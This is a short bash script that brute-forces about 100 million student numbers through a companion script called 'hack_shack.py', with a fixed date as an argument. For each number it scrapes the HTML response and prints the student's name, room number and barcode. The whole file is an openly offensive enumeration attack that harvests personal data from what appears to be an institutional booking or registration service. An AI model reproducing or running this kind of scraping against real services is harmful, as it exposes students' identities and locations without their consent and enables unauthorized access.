# This loops through hack_shack.py and takes pot shots at student numbers.
# If it is successful, it is printed to the shell terminal output

for student_num in {1000000000..1100000000}
do
    res=`python hack_shack.py 19 11 2013 $student_num`

    # Barcode
    barcode=`echo $res | tr '<>' '\n' | grep barcode | tr '"' '\n' | tail -4 | head -1`

    # Room number
    room=`echo $res | tr '<>' '\n' | grep room | tr '"' '\n' | tail -4 | head -1`

    # Name
    name=`echo $res | tr '<>' '\n' | grep 'name="name"' | tr '"' '\n' | tail -4 | head -1`

    # Print altogether
    echo $student_num $name $room $barcode
    
done
